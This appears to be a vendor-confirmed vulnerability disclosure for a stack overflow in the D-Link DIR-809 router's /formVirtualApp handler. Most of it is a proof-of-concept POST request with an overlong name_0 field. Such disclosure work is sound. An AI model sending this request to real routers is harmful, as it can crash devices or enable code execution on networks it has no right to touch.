# D-Link DIR809 Vulnerability

The Vulnerability is in page `/formVirtualApp` which influences the latest version of this router OS. 

The firmware version is [DIR-809Ax_FW1.12WWB03_20190410](http://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DIR-809) 

## Progress

- Confirmed by vendor. 


## Vulnerability description

In the function `FUN_8004776c` ( page `/formVirtualApp` ), we find a stack overflow vulnerability, which allows attackers to execute arbitrary code on system via a crafted post request. 

Here is the description,  

1. The `get_var` function extracts user input from the a http request. For example, the code below will extract the value of a key of format `"name_%d"` in the http post request which is completely under the attacker's control. 
2. The string `pcVar2` obtained from user is copied onto the stack using `strcpy` without checking its length. So we can make the stack buffer overflow in `local_f8`. 

![2021-05-10_10h22_15](README/2021-05-10_10h22_15.png)



## PoC

``` 
POST /formVirtualApp.htm HTTP/1.1
Host: 192.168.0.1
Content-Length: 3894
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.1/Advanced/Virtual_Server_Server.asp?t=1620547787744
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: uid=jFLW3efjuL
Connection: close

settingsChanged=1&curTime=1620547811394&HNAP_AUTH=A4C3C6EB82B72B04DB58611805409259+1620547811&submit-url=%2FAdvanced%2FVirtual_Server_Server.asp&index=1&enabled_0=0&used_0=0&name_0=123123123123123*0x200&default_virtual_servers_0=-1&public_port_0=8999&ip_0=192.168.0.21&computer_list_ipaddr_select_0=-1&private_port_0=8999&protocol_0=1&index=2&enabled_1=0&used_1=0&name_1=&default_virtual_servers_1=-1&public_port_1=&ip_1=&computer_list_ipaddr_select_1=-1&private_port_1=&protocol_1=1&index=3&enabled_2=0&used_2=0&name_2=&default_virtual_servers_2=-1&public_port_2=&ip_2=&computer_list_ipaddr_select_2=-1&private_port_2=&protocol_2=1&index=4&enabled_3=0&used_3=0&name_3=&default_virtual_servers_3=-1&public_port_3=&ip_3=&computer_list_ipaddr_select_3=-1&private_port_3=&protocol_3=1&index=5&enabled_4=0&used_4=0&name_4=&default_virtual_servers_4=-1&public_port_4=&ip_4=&computer_list_ipaddr_select_4=-1&private_port_4=&protocol_4=1&index=6&enabled_5=0&used_5=0&name_5=&default_virtual_servers_5=-1&public_port_5=&ip_5=&computer_list_ipaddr_select_5=-1&private_port_5=&protocol_5=1&index=7&enabled_6=0&used_6=0&name_6=&default_virtual_servers_6=-1&public_port_6=&ip_6=&computer_list_ipaddr_select_6=-1&private_port_6=&protocol_6=1&index=8&enabled_7=0&used_7=0&name_7=&default_virtual_servers_7=-1&public_port_7=&ip_7=&computer_list_ipaddr_select_7=-1&private_port_7=&protocol_7=1&index=9&enabled_8=0&used_8=0&name_8=&default_virtual_servers_8=-1&public_port_8=&ip_8=&computer_list_ipaddr_select_8=-1&private_port_8=&protocol_8=1&index=10&enabled_9=0&used_9=0&name_9=&default_virtual_servers_9=-1&public_port_9=&ip_9=&computer_list_ipaddr_select_9=-1&private_port_9=&protocol_9=1&index=11&enabled_10=0&used_10=0&name_10=&default_virtual_servers_10=-1&public_port_10=&ip_10=&computer_list_ipaddr_select_10=-1&private_port_10=&protocol_10=1&index=12&enabled_11=0&used_11=0&name_11=&default_virtual_servers_11=-1&public_port_11=&ip_11=&computer_list_ipaddr_select_11=-1&private_port_11=&protocol_11=1&index=13&enabled_12=0&used_12=0&name_12=&default_virtual_servers_12=-1&public_port_12=&ip_12=&computer_list_ipaddr_select_12=-1&private_port_12=&protocol_12=1&index=14&enabled_13=0&used_13=0&name_13=&default_virtual_servers_13=-1&public_port_13=&ip_13=&computer_list_ipaddr_select_13=-1&private_port_13=&protocol_13=1&index=15&enabled_14=0&used_14=0&name_14=&default_virtual_servers_14=-1&public_port_14=&ip_14=&computer_list_ipaddr_select_14=-1&private_port_14=&protocol_14=1&index=16&enabled_15=0&used_15=0&name_15=&default_virtual_servers_15=-1&public_port_15=&ip_15=&computer_list_ipaddr_select_15=-1&private_port_15=&protocol_15=1&index=17&enabled_16=0&used_16=0&name_16=&default_virtual_servers_16=-1&public_port_16=&ip_16=&computer_list_ipaddr_select_16=-1&private_port_16=&protocol_16=1&index=18&enabled_17=0&used_17=0&name_17=&default_virtual_servers_17=-1&public_port_17=&ip_17=&computer_list_ipaddr_select_17=-1&private_port_17=&protocol_17=1&index=19&enabled_18=0&used_18=0&name_18=&default_virtual_servers_18=-1&public_port_18=&ip_18=&computer_list_ipaddr_select_18=-1&private_port_18=&protocol_18=1&index=20&enabled_19=0&used_19=0&name_19=&default_virtual_servers_19=0&public_port_19=&ip_19=&computer_list_ipaddr_select_19=-1&private_port_19=&protocol_19=1&index=21&enabled_20=0&used_20=0&name_20=&default_virtual_servers_20=0&public_port_20=&ip_20=&computer_list_ipaddr_select_20=-1&private_port_20=&protocol_20=1&index=22&enabled_21=0&used_21=0&name_21=&default_virtual_servers_21=-1&public_port_21=&ip_21=&computer_list_ipaddr_select_21=-1&private_port_21=&protocol_21=1&index=23&enabled_22=0&used_22=0&name_22=&default_virtual_servers_22=-1&public_port_22=&ip_22=&computer_list_ipaddr_select_22=-1&private_port_22=&protocol_22=1&index=24&enabled_23=0&used_23=0&name_23=&default_virtual_servers_23=-1&public_port_23=&ip_23=&computer_list_ipaddr_select_23=-1&private_port_23=&protocol_23=1

```